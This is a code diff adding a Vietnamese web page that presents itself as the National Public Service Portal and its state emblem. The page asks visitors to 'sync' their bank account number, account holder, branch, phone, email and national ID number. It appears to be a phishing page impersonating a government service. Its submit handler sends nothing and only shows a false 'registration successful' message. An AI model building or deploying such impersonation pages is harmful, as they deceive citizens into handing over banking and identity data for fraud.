@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đồng bộ ngân hàng - Cổng Dịch vụ công quốc gia</title>
+    <link rel="icon" type="image/png" href="/p/home/img/header/quoc_huy.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f6fa; }
+        .card { background: #fff; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.06); padding: 32px; }
+        .section-title { font-size: 16px; font-weight: 700; color: #CE7A58; padding: 16px 0 12px; border-bottom: 2px solid #CE7A58; margin-bottom: 20px; letter-spacing: 0.5px; }
+        input, select, textarea { border: 1.5px solid #d1d5db; padding: 10px 14px; width: 100%; border-radius: 8px; font-size: 14px; font-family: inherit; outline: none; transition: border-color 0.2s, box-shadow 0.2s; background: #fff; box-sizing: border-box; }
+        input:focus, select:focus, textarea:focus { border-color: #CE7A58; box-shadow: 0 0 0 3px rgba(206,122,88,0.15); }
+        textarea { resize: vertical; min-height: 80px; }
+        .btn-submit { background: #CE7A58; color: #fff; border: none; border-radius: 6px; padding: 12px 36px; cursor: pointer; font-weight: 700; font-size: 15px; transition: all 0.2s; }
+        .btn-submit:hover { background: #B8694A; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(206,122,88,0.4); }
+        .form-label { font-size: 14px; font-weight: 600; color: #333; margin-bottom: 6px; display: block; }
+        @media (max-width: 768px) { .card { padding: 16px; } }
+    </style>
+</head>
+<body>
+<div class="header-bar bg-white shadow-sm sticky top-0 z-50">
+    <div class="max-w-6xl mx-auto px-4">
+        <div class="flex items-center justify-between min-h-[64px]">
+            <div onclick="goHome()" class="flex items-center gap-2 cursor-pointer hover:opacity-80">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1e2f41" stroke-width="2.5" stroke-linecap="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                <span class="text-sm font-medium text-gray-600">Quay lại</span>
+            </div>
+            <span class="font-bold text-sm md:text-base text-[#1e2f41]">CỔNG DỊCH VỤ CÔNG QUỐC GIA</span>
+            <div></div>
+        </div>
+    </div>
+</div>
+
+<div class="max-w-3xl mx-auto px-4 py-8">
+    <h1 class="text-2xl font-extrabold text-[#1e2f41] mb-2">ĐỒNG BỘ THÔNG TIN NGÂN HÀNG</h1>
+    <p class="text-sm text-gray-500 mb-6">Đăng ký đồng bộ thông tin tài khoản ngân hàng phục vụ thanh toán trực tuyến</p>
+
+    <div class="card">
+        <div class="section-title">🏦 THÔNG TIN TÀI KHOẢN NGÂN HÀNG</div>
+        <form id="bankForm" onsubmit="return false;">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+                <div>
+                    <label class="form-label">Ngân hàng</label>
+                    <select id="bankName">
+                        <option value="">Chọn ngân hàng</option>
+                        <option value="vietcombank">Vietcombank</option>
+                        <option value="techcombank">Techcombank</option>
+                        <option value="bidv">BIDV</option>
+                        <option value="vietinbank">VietinBank</option>
+                        <option value="agribank">Agribank</option>
+                        <option value="mb-bank">MB Bank</option>
+                        <option value="acb">ACB</option>
+                        <option value="vpbank">VPBank</option>
+                        <option value="tpbank">TPBank</option>
+                        <option value="hdbank">HDBank</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="form-label">Chi nhánh</label>
+                    <input type="text" id="branch" placeholder="Nhập chi nhánh ngân hàng">
+                </div>
+                <div>
+                    <label class="form-label">Số tài khoản</label>
+                    <input type="text" id="accountNumber" placeholder="Nhập số tài khoản" maxlength="20">
+                </div>
+                <div>
+                    <label class="form-label">Chủ tài khoản</label>
+                    <input type="text" id="accountName" placeholder="Nhập tên chủ tài khoản">
+                </div>
+            </div>
+            <div class="mt-6 pt-5 border-t border-gray-200">
+                <div class="section-title">👤 THÔNG TIN NGƯỜI ĐĂNG KÝ</div>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+                    <div>
+                        <label class="form-label">Họ và tên</label>
+                        <input type="text" id="fullName" placeholder="Nhập họ và tên">
+                    </div>
+                    <div>
+                        <label class="form-label">Số điện thoại</label>
+                        <input type="tel" id="phone" placeholder="Nhập số điện thoại" maxlength="11">
+                    </div>
+                    <div>
+                        <label class="form-label">Email</label>
+                        <input type="email" id="email" placeholder="Nhập email">
+                    </div>
+                    <div>
+                        <label class="form-label">CMND/CCCD</label>
+                        <input type="text" id="idNumber" placeholder="Nhập số CMND/CCCD" maxlength="12">
+                    </div>
+                </div>
+            </div>
+            <div class="flex justify-center md:justify-end mt-6">
+                <button type="submit" class="btn-submit" onclick="submitBankReg()">Đăng ký đồng bộ</button>
+            </div>
+        </form>
+        <div id="alertBox" class="mt-4" style="display:none;"></div>
+    </div>
+</div>
+
+<script>
+function goHome() { window.location.href = '/'; }
+function submitBankReg() {
+    const data = {
+        bankName: document.getElementById('bankName').value,
+        branch: document.getElementById('branch').value.trim(),
+        accountNumber: document.getElementById('accountNumber').value.trim(),
+        accountName: document.getElementById('accountName').value.trim(),
+        fullName: document.getElementById('fullName').value.trim(),
+        phone: document.getElementById('phone').value.trim(),
+        email: document.getElementById('email').value.trim(),
+        idNumber: document.getElementById('idNumber').value.trim()
+    };
+    if (!data.bankName || !data.accountNumber || !data.accountName) {
+        showAlert('Vui lòng điền thông tin ngân hàng', 'error');
+        return;
+    }
+    showAlert('Đăng ký đồng bộ thành công! Thông tin của bạn sẽ được xử lý trong vòng 24h.', 'success');
+    document.getElementById('bankForm').reset();
+}
+
+function showAlert(msg, type) {
+    const box = document.getElementById('alertBox');
+    box.textContent = msg;
+    box.className = 'mt-4 p-4 rounded-lg text-sm font-medium ' + (type === 'success' ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800');
+    box.style.display = 'block';
+    setTimeout(() => { box.style.display = 'none'; }, 5000);
+}
+</script>
+</body>
+</html>
